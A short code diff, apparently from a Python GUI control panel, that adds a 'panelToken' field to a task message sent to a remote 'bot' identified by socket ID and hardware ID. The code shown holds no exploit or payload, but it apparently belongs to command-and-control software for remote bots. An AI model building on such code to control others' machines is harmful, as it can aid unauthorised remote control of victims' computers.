@@ -113,6 +113,7 @@ QTextEdit {
 
 
         bot_task = {
+            "panelToken": self.token,
             "socketId": self.bot['socketId'],
             "hwid": self.bot['hwid'],
             "command": command,
